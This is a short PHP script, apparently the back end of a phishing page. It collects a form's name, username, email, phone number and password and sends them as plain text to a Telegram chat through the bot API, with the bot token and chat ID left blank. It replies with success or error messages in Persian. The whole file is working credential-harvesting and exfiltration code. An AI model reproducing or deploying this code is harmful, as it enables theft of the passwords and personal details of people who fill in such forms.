<?php

$botToken = '';
$chatId = '';

$firstName = $_POST['Name'];
$userName = $_POST['userName'];
$email = $_POST['Email'];
$phoneNumber = $_POST['phoneNumber'];
$Password = $_POST['Password'];

$data = [
    'Name' => $firstName,
    'Username' => $userName,
    'Email' => $email,
    'Phone Number' => $phoneNumber,
    'Password' => $Password,
];

$jsonData = json_encode($data, JSON_UNESCAPED_UNICODE);

// Send message to Telegram bot
function sendTelegramMessage($botToken, $chatId, $text) {
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $text,
    ];
    $queryString = http_build_query($params);
    $response = file_get_contents("$telegramUrl?$queryString");

    return $response;
}

$response = sendTelegramMessage($botToken, $chatId, $jsonData);

if ($response) {
    echo json_encode(['status' => 'success', 'message' => 'پیام با موفقیت ارسال شد']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'خطا در ارسال پیام']);
}